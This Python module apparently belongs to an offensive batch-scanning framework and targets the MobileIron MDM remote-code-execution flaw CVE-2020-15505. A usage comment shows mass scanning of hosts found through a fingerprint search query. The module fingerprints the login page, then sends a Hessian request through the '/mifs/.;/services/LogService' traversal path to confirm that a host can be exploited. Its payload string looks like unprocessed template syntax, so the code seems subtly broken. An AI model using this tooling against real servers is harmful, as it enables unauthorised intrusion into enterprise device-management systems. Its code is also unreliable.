# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-12-07 20:32

from core.data import gLogger
from core.parser.urlparser import UrlParser
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.MobileIron.CVE-2020-15505 -cs -fs "app=\"MobileIron-User-Portal\""


class Script(BaseScript):
    name = 'MobileIron'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2020-15505'
        # 来源
        self.bug_refer = 'https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html'
        # 特定路径判断
        self.detect_path_list = ['/mifs/user/login.jsp']
        # exec
        self.exec_path_list = ['/mifs/.;/services/LogService']
        # 相关信息
        self.info = '''RCE in MobileIron Core & Connector <= v10.6 & Sentry <= v9.8
        10.3.0.3 及之前版本
        10.4.0.0、10.4.0.1、10.4.0.2、10.4.0.3、10.5.1.0、10.5.2.0 和 10.6.0.0 Sentry 版本 9.7.2 及之前版本9.8.0
        Monitor and Reporting Database (RDB) 版本 2.0.0.1 及之前版本
        '''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if 'MobileIron' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        host = UrlParser(self.target).subdomain
        headers = self.headers.copy()
        headers.update({'Host': host, 'Referer': f'https://{host}', 'Content-Type': 'x-application/hessian', 'Connection': 'close'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = "{{hex_decode('630200480004')}}"
                async with session.post(url=url, data=data, headers=headers, timeout=self.req_timeout) as response:
                    if response is not None and response.status == 200 and response.headers.get('Content-Type', '') and \
                            'application/x-hessian' in response.headers.get('Content-Type', ''):
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
